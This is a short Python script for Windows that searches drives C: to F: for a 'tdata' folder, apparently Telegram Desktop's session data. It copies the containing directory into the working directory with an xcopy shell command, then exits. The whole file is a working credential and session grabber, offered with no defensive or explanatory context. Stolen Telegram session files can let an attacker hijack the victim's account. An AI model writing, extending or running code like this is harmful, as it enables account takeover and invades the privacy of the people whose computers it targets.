from os import walk ,getcwd ,system
import shutil
def copy(tele):
    tele += "\""
    destin = getcwd() + "\""
    system("xcopy /s/z \"{} \"{}".format(tele,destin))
    exit(0)
for root, subdirs ,files in walk('C:\\'):
    for d in subdirs:
        if d == "tdata":
            copy(root)
for root, subdirs ,files in walk('D:\\'):
    for d in subdirs:
        if d == "tdata":
            copy(root)
for root, subdirs ,files in walk('E:\\'):
    for d in subdirs:
        if d == "tdata":
            copy(root)
for root, subdirs ,files in walk('F:\\'):
    for d in subdirs:
        if d == "tdata":
            copy(root)